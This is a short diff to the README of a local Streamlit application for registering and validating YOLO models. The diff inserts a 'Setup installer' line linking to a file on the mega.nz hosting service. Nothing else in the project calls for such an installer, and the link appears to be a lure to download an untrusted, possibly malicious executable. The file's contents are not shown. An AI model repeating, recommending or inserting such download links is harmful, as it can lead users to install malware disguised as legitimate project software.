@@ -4,6 +4,9 @@ A trusted-local Streamlit desktop application for registering YOLO models, valid
 
 This branch intentionally keeps the existing Streamlit interface. It requires no account or sign-in and stores application state in a local SQLite database.
 
+Setup installer:
+https://mega.nz/file/DToSUbzY#PwChOryc-Dw6us0WYWT8S8lvckbmpktiLSAoHIvgM-E
+
 ## App flow
 
 1. Create or select a model.
